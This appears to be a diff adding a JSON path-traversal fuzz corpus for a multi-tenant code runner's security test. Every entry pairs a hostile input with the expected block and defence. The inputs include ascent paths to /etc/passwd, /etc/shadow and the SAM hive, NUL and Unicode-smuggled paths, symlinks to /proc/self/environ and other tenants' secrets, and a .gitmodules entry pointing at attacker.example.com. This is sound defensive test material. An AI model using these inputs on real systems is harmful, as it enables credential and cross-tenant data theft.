@@ -1,0 +1,278 @@
+{
+  "$schema": "https://json-schema.org/draft/2020-12/schema",
+  "corpus": "path-traversal",
+  "version": "1.0.0",
+  "milestone": "M1",
+  "min_size_m1": 30,
+  "owner": "shield",
+  "threat_model_ref": "architecture/threat-model.md §3.4",
+  "trust_boundary_ref": ["TB-5", "TB-9"],
+  "consumer_test": "tests/security/path-traversal-fuzz.spec.ts",
+  "notes": "Each pattern is a path-like input arriving in the runner from customer-controlled sources: filenames in a cloned repo, paths in .gitmodules, symlink targets, tarball entries (V2), or user-supplied identifiers. Defense: safeOpen(rel) wrapper applies fs.realpathSync() THEN startsWith(WORKDIR + sep) — defeats .. ascent AND symlink chase. NUL byte rejected pre-resolve. Symlinks at directory-walk time rejected via fs.lstatSync().isSymbolicLink(). Working dir /var/runs/<tenant-id>/<run-id>/ is mode 0700, owned by runner UID, and (M1) read-only mounted. Per Forge ingestion-limits: .git/hooks, .gitattributes, .gitmodules, .git/config never read; package-manager scripts never executed.",
+  "patterns": [
+    {
+      "id": "PT-001",
+      "category": "dot_dot_ascent",
+      "pattern": "../../../../etc/passwd",
+      "expected_action": "block",
+      "expected_outcome": "safeOpen rejects: fs.realpathSync resolves to /etc/passwd which does not startWith WORKDIR. Throws PathEscapeError; runner emits a 'malformed_path' finding and continues.",
+      "notes": "PT-1 in threat-model.md §3.4. Canonical Unix path-traversal. CVE-2016-7193 reference (Word RTF path traversal) — same class, different surface."
+    },
+    {
+      "id": "PT-002",
+      "category": "dot_dot_ascent",
+      "pattern": "..//..//..//..//etc/passwd",
+      "expected_action": "block",
+      "expected_outcome": "safeOpen rejects: realpathSync collapses double slashes to single, resolves to /etc/passwd, fails startsWith check.",
+      "notes": "Double-slash padding. Bypasses naive 'split on /' then 'check for ..' filters."
+    },
+    {
+      "id": "PT-003",
+      "category": "dot_dot_ascent",
+      "pattern": "....//....//....//etc/passwd",
+      "expected_action": "block",
+      "expected_outcome": "safeOpen rejects: realpathSync handles '....' (four dots) as a literal directory name lookup; if literal '....' does not exist, ENOENT; if it does, the canonical path still escapes WORKDIR and startsWith fails.",
+      "notes": "Quad-dot bypass. Documented bypass against filters that strip exactly two-dot sequences (CVE-2019-9213 family in some Java path libraries)."
+    },
+    {
+      "id": "PT-004",
+      "category": "dot_dot_ascent",
+      "pattern": "src/components/../../../../etc/shadow",
+      "expected_action": "block",
+      "expected_outcome": "safeOpen rejects on realpath resolution and startsWith mismatch.",
+      "notes": "Legitimate-looking prefix (src/components/) followed by ascent. Naive substring filters that only check the path start get bypassed; realpath-based filters do not."
+    },
+    {
+      "id": "PT-005",
+      "category": "dot_dot_ascent",
+      "pattern": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "expected_action": "block",
+      "expected_outcome": "Path is URL-decoded ONCE at the ingest boundary (paths inside repos should never be URL-encoded — the encoded form is suspicious). After decode the realpath escapes WORKDIR.",
+      "notes": "URL-encoded ../../. PT-3 in threat-model.md §3.4. Apache Tomcat CVE-2017-12615 was rooted in inconsistent decoding."
+    },
+    {
+      "id": "PT-006",
+      "category": "windows_backslash",
+      "pattern": "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "expected_action": "block",
+      "expected_outcome": "Windows-aware path canonicalizer normalizes \\ to / pre-realpath; realpath then escapes WORKDIR and startsWith fails. PT-5 in threat-model.md §3.4.",
+      "notes": "Windows backslash variant. Relevant for Windows CI runners (Pipeline R10). Note: Node.js on Linux treats backslash as a literal char in filenames — Windows-aware wrapper required."
+    },
+    {
+      "id": "PT-007",
+      "category": "windows_backslash",
+      "pattern": "..\\../..\\../..\\../etc/passwd",
+      "expected_action": "block",
+      "expected_outcome": "Mixed forward/backward slash; Windows-aware canonicalizer normalizes both forms, realpath escapes WORKDIR.",
+      "notes": "Mixed slash bypass. Real-world: CVE-2020-7615 (Express.static path traversal) hit this exact pattern."
+    },
+    {
+      "id": "PT-008",
+      "category": "windows_backslash",
+      "pattern": "src\\..\\..\\..\\..\\..\\Windows\\System32\\config\\SAM",
+      "expected_action": "block",
+      "expected_outcome": "Same Windows canonicalization + realpath + startsWith.",
+      "notes": "Windows SAM file traversal. Target = NT auth registry hive. Worst-case escape primitive on Windows runners."
+    },
+    {
+      "id": "PT-009",
+      "category": "null_byte",
+      "pattern": "harmless-image.png\u0000../../etc/passwd",
+      "expected_action": "block",
+      "expected_outcome": "safeOpen wrapper rejects pre-realpath: any path containing \\x00 throws NullByteError. Defense in depth: modern Node.js (>=10) rejects NUL natively, but the wrapper re-checks. PT-4 in threat-model.md §3.4.",
+      "notes": "NUL-byte path truncation. Class of bug behind CVE-2006-7243 (PHP), Ruby's path-handling pre-2010, and many file-extension-allowlist bypasses."
+    },
+    {
+      "id": "PT-010",
+      "category": "null_byte",
+      "pattern": "config.json%00.bak",
+      "expected_action": "block",
+      "expected_outcome": "After URL-decode at ingest, the wrapper sees \\x00 and rejects.",
+      "notes": "URL-encoded NUL byte. Documented bypass against allow-list extension filters."
+    },
+    {
+      "id": "PT-011",
+      "category": "null_byte",
+      "pattern": "uploads/avatar.jpg\u0000.txt",
+      "expected_action": "block",
+      "expected_outcome": "NUL rejected at wrapper.",
+      "notes": "NUL-byte extension-confusion. Once stored on disk on legacy filesystems, the file would be readable as 'avatar.jpg' but pass an allowlist that only sees '.txt'."
+    },
+    {
+      "id": "PT-012",
+      "category": "unicode_overlong",
+      "pattern": "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+      "expected_action": "block",
+      "expected_outcome": "Wrapper rejects: overlong UTF-8 encoding for '.' (0xC0 0xAE) is non-shortest-form per RFC 3629 and ingest unicode-normalize step uses Buffer.from(...).toString('utf-8', { strict: true }) which rejects overlong sequences. Even if it didn't, realpath would resolve and startsWith would fail.",
+      "notes": "PT-3 in threat-model.md §3.4. Overlong UTF-8 — class of bug behind CVE-2001-0500 (IIS Unicode bug), the original directory-traversal RCE. Modern wrappers MUST reject non-shortest UTF-8."
+    },
+    {
+      "id": "PT-013",
+      "category": "unicode_overlong",
+      "pattern": "%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/etc/passwd",
+      "expected_action": "block",
+      "expected_outcome": "Overlong 3-byte UTF-8 encoding for '.'. Strict UTF-8 decoder rejects.",
+      "notes": "3-byte overlong variant. Different code-path in some decoders — has been the actual bypass when 2-byte form was patched."
+    },
+    {
+      "id": "PT-014",
+      "category": "unicode_overlong",
+      "pattern": "..∕..∕etc∕passwd",
+      "expected_action": "block",
+      "expected_outcome": "Unicode NFKC normalization in the wrapper converts U+2215 (DIVISION SLASH) to U+002F (SOLIDUS); the result is the literal ../../etc/passwd and realpath escapes WORKDIR.",
+      "notes": "Unicode confusable-slash. The U+2215 division slash is one of ~30 slash homoglyphs in the Unicode confusables list. CVE-2021-42574 (Trojan Source) cited inspiration."
+    },
+    {
+      "id": "PT-015",
+      "category": "unicode_overlong",
+      "pattern": "．．／．．／．．／etc／passwd",
+      "expected_action": "block",
+      "expected_outcome": "Fullwidth . (U+FF0E) and / (U+FF0F) — NFKC normalization collapses to ASCII ../../../etc/passwd; realpath escapes.",
+      "notes": "Fullwidth Latin path. Same class as PT-014 but with the most-common fullwidth confusables. Real-world bypass against several PHP CMS path filters in 2020-2022."
+    },
+    {
+      "id": "PT-016",
+      "category": "symlink",
+      "pattern": "evil-symlink",
+      "symlink_target": "/etc/passwd",
+      "expected_action": "block",
+      "expected_outcome": "At directory-walk: fs.lstatSync('evil-symlink').isSymbolicLink() === true → wrapper skips the entry AND emits a 'symlink_rejected' finding. Even if it weren't skipped, safeOpen('evil-symlink') would resolve via realpathSync to /etc/passwd which fails startsWith. PT-2 in threat-model.md §3.4.",
+      "notes": "Symlink in repo pointing to host /etc/passwd. The git clone uses -c core.symlinks=false but this is documented as insufficient (LFS pointers bite); belt is the directory-walk lstat check."
+    },
+    {
+      "id": "PT-017",
+      "category": "symlink",
+      "pattern": "tenant-leak",
+      "symlink_target": "/var/runs/other-tenant-id/run-abc/.env",
+      "expected_action": "block",
+      "expected_outcome": "Same lstat-then-skip path; even if followed, realpath escapes this run's WORKDIR and startsWith fails. Composes with the per-tenant working dir mode 0700 (cross-tenant read would fail at OS layer too).",
+      "notes": "Cross-tenant symlink — the highest-impact path-traversal in a multi-tenant runner. Defense is layered: mode 0700, separate UIDs (if container UID maps per tenant), AND realpath check."
+    },
+    {
+      "id": "PT-018",
+      "category": "symlink",
+      "pattern": "node_modules/.../somelib/index.js",
+      "symlink_target": "../../../../../../usr/bin/node",
+      "expected_action": "block",
+      "expected_outcome": "Lstat-then-skip at directory walk. node_modules is in the excluded-paths set (D9) but the runner must still defend in case the exclusion list is bypassed.",
+      "notes": "Symlink in node_modules pointing to host binary. CVE-2021-23413 (jszip symlink follow) cited inspiration. Even with node_modules excluded, the defense must hold."
+    },
+    {
+      "id": "PT-019",
+      "category": "symlink",
+      "pattern": "build/output.dat",
+      "symlink_target": "/proc/self/environ",
+      "expected_action": "block",
+      "expected_outcome": "Lstat skip at walk. /proc/self/environ would leak the runner process environment (which holds the run-scoped JWT for 5 min) if read.",
+      "notes": "Symlink to /proc/self/environ — exfils the runner process env. Why we minimize what we put in env: the JWT is the only env var, and it's a 5-min token. Defense in depth."
+    },
+    {
+      "id": "PT-020",
+      "category": "absolute_path",
+      "pattern": "/etc/passwd",
+      "expected_action": "block",
+      "expected_outcome": "safeOpen(rel) treats absolute paths by doing path.resolve(WORKDIR, '/etc/passwd') which (per POSIX path.resolve semantics) returns '/etc/passwd'; realpath confirms; startsWith fails. Throws PathEscapeError.",
+      "notes": "Direct absolute path. The path.resolve() POSIX behavior where an absolute right-arg overrides the left-arg is the gotcha; the startsWith check is the catch."
+    },
+    {
+      "id": "PT-021",
+      "category": "absolute_path",
+      "pattern": "/var/runs/other-tenant-id/run-xyz/.env",
+      "expected_action": "block",
+      "expected_outcome": "Absolute path; startsWith(WORKDIR) fails because WORKDIR is /var/runs/<this-tenant>/<this-run>/. Even at the OS layer, the other tenant's dir is mode 0700 with a different UID.",
+      "notes": "Direct cross-tenant absolute path. The single most-load-bearing defense — caught at multiple layers."
+    },
+    {
+      "id": "PT-022",
+      "category": "absolute_path",
+      "pattern": "C:\\Windows\\System32\\config\\SAM",
+      "expected_action": "block",
+      "expected_outcome": "Windows absolute path on a Linux runner is treated as a relative literal filename 'C:\\Windows\\System32\\config\\SAM' (which doesn't exist); on a Windows runner the canonicalizer + startsWith fires.",
+      "notes": "Cross-OS absolute path. Both OS variants must reject — Linux via realpath ENOENT, Windows via canonicalization."
+    },
+    {
+      "id": "PT-023",
+      "category": "windows_long_path",
+      "pattern": "\\\\?\\C:\\Windows\\System32\\drivers\\etc\\hosts",
+      "expected_action": "block",
+      "expected_outcome": "Windows long-path prefix (\\\\?\\) bypasses Win32 path normalization and grants raw NT-namespace access. Wrapper detects \\\\?\\ prefix and rejects regardless of what follows.",
+      "notes": "Win32 long-path / NT-namespace prefix. CVE-2020-1207 family. Real bypass against many Windows path-canonicalization libraries."
+    },
+    {
+      "id": "PT-024",
+      "category": "windows_long_path",
+      "pattern": "\\\\.\\C:\\Windows\\win.ini",
+      "expected_action": "block",
+      "expected_outcome": "Win32 device-namespace prefix (\\\\.\\) — wrapper detects prefix and rejects.",
+      "notes": "Win32 device namespace. Grants access to physical drives and devices. Filter must catch both \\\\?\\ and \\\\.\\ prefixes."
+    },
+    {
+      "id": "PT-025",
+      "category": "git_hooks",
+      "pattern": ".git/hooks/post-checkout",
+      "expected_action": "block",
+      "expected_outcome": "Forge runner: clone with core.hooksPath=/dev/null AND .git/ directory is in the excluded-paths set (D9). The runner NEVER reads from .git/. Even if it did, the runner does not EXECUTE the hook — it's a pure read-only ingestor.",
+      "notes": "Triggers on git operations. Note from threat-model.md §3.4 mitigation #8: 'No package-manager execution. The runner is a pure read-only ingestor — never an executor of customer code.' This is the policy backstop."
+    },
+    {
+      "id": "PT-026",
+      "category": "git_hooks",
+      "pattern": ".git/hooks/pre-commit",
+      "expected_action": "block",
+      "expected_outcome": "Same: .git excluded path; no hook execution; clone with core.hooksPath=/dev/null.",
+      "notes": "Pre-commit hook payload — would fire on any local commit operation, but the runner doesn't commit. Belt: hooksPath=/dev/null kills it. Suspenders: .git excluded from read."
+    },
+    {
+      "id": "PT-027",
+      "category": "git_hooks",
+      "pattern": ".git/config",
+      "expected_action": "block",
+      "expected_outcome": ".git is in the D9 excluded-paths set. The clone-time core.hooksPath override is set via -c flag at clone time (per threat-model.md §3.4 mitigation), not from .git/config.",
+      "notes": ".git/config can override core.hooksPath if the runner ever re-reads it. The defense is to set the override at clone time AND never re-read .git/config."
+    },
+    {
+      "id": "PT-028",
+      "category": "gitattributes",
+      "pattern": ".gitattributes",
+      "content": "* filter=evil-payload\n* diff=evil-payload\n* merge=evil-payload",
+      "expected_action": "block",
+      "expected_outcome": "Forge runner: .gitattributes is in the D9 excluded-paths set. Clone uses -c filter.evil-payload.clean=true (or rather, no custom filters defined) AND --no-recurse-submodules. The runner does not invoke git diff / git merge on customer repos.",
+      "notes": "gitattributes filter directive — CVE-2017-1000117 / CVE-2018-17456 family. A repo with a malicious filter directive could trigger code execution at clone/checkout if filters were trusted. Defense: never invoke git operations beyond the initial shallow clone."
+    },
+    {
+      "id": "PT-029",
+      "category": "gitattributes",
+      "pattern": ".gitattributes",
+      "content": "* binary\n*.md text=auto eol=crlf working-tree-encoding=UTF-16",
+      "expected_action": "block",
+      "expected_outcome": "Same exclusion. Even if read, the runner does not honor working-tree-encoding directives; all files are read as binary buffers and decoded by content-type detection.",
+      "notes": "Working-tree-encoding manipulation — CVE-2022-24765 reference. Forces Git to interpret files via OS-level encoding shims that have been escape vectors historically."
+    },
+    {
+      "id": "PT-030",
+      "category": "gitattributes",
+      "pattern": ".gitattributes",
+      "content": "*.md export-subst\n*.md export-ignore",
+      "expected_action": "block",
+      "expected_outcome": "Excluded; runner does not invoke git archive / git checkout-index operations that would respect export-* directives.",
+      "notes": "Export-subst can trigger keyword substitution. Less-impactful but corpus completeness."
+    },
+    {
+      "id": "PT-031",
+      "category": "long_slash",
+      "pattern": "////etc////passwd",
+      "expected_action": "block",
+      "expected_outcome": "safeOpen: realpathSync normalizes multiple slashes to single, resolves to /etc/passwd, fails startsWith(WORKDIR).",
+      "notes": "PT-6 in threat-model.md §3.4. Leading-slash + multi-slash padding. Bypasses naive 'strip leading slash' filters."
+    },
+    {
+      "id": "PT-032",
+      "category": "gitmodules",
+      "pattern": ".gitmodules",
+      "content": "[submodule \"evil\"]\n  path = ../../../../tmp/owned\n  url = https://attacker.example.com/payload.git",
+      "expected_action": "block",
+      "expected_outcome": "Forge runner: --no-recurse-submodules at clone (threat-model.md §3.4 mitigation #2 + ingestion-limits D9). .gitmodules is in the excluded-paths set; .gitmodules submodules not auto-fetched. The path-traversal in the 'path' field is irrelevant because the submodule is never materialized.",
+      "notes": "Submodule path-traversal CVE class: CVE-2018-11235 (Git remote-code-execution via submodule names). The defense composes ingestion limits with this corpus."
+    }
+  ]
+}
